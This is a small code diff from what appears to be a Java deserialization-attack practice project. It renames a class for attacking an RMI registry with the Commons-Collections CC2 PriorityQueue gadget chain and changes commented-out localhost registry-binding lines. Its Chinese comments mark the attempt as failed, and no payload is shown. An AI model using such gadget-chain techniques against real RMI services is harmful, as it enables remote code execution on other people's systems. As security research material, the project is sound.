@@ -16,16 +16,15 @@ import java.util.PriorityQueue;
 // 改用 CC2_PriorityQueue 链进行测试.
 // 被序列化的对象，必须要implement Remote接口。
 // fail 失败！！
-public class ToAttackRegistry_Server_test_java8_CC2_fail_Remote {
+public class ToAttackRegistry_test_java8_CC2_Server_Remote_Fail {
 
     public static void main(String[] args) throws Exception {
-        ToAttackRegistry_Server_test_java8_CC2_fail_Remote eval = new ToAttackRegistry_Server_test_java8_CC2_fail_Remote();
+        ToAttackRegistry_test_java8_CC2_Server_Remote_Fail eval = new ToAttackRegistry_test_java8_CC2_Server_Remote_Fail();
 
 
-//        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1234);
-//        registry_remote.bind("HelloRegistry", eval.eval());     //被序列化的对象，必须要implement Remote接口
-//        System.out.println("rmi start at 1099");
-
+//        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
+//        registry_remote.bind("HelloRegistry", eval);     //被序列化的对象，必须要implement Remote接口
+//        System.out.println("rmi start at 3333");
 
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
